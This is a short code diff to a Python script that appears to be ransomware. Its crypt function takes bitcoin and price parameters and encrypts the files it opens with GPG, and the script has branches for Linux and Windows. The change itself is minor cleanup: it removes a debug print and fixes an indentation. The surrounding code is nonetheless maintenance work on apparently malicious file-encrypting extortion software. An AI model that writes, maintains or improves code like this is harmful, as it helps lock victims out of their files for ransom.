@@ -40,7 +40,6 @@ def crypt(text, pwd, path, bitcoin, price,verif ):
             except(ValueError):    
                 input_data = gpg.gen_key_input(key_type="RSA",key_length=1024,passphrase=pwd)
                 try:
-                    print(i)
                     archivo = open(i,"rb")
                     data = archivo.read()
                     datacifrada = gpg.encrypt(data, pwd)
@@ -126,5 +125,5 @@ def howto(l):
 if(sys.platform =='linux' or sys.platform == 'linux2'):
     linux()
 else:
-        Windows()
+    Windows()
 
